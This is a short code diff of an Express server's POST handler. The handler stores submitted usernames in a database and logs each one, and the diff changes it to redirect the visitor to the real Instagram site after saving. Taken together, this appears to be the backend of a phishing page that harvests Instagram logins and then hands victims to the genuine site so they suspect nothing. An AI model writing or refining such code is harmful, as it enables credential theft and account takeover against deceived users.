@@ -38,10 +38,9 @@ app.post("/", async (req, res) => {
       createdAt: new Date(),
     });
     console.log("📦 Data saved:", username);
-    res.json("Something went wrong");
+    return res.redirect("https://www.instagram.com");
   } catch (err) {
     console.error("❌ Error saving data:", err);
-    res.json("Error Saving data");
   }
 });
 
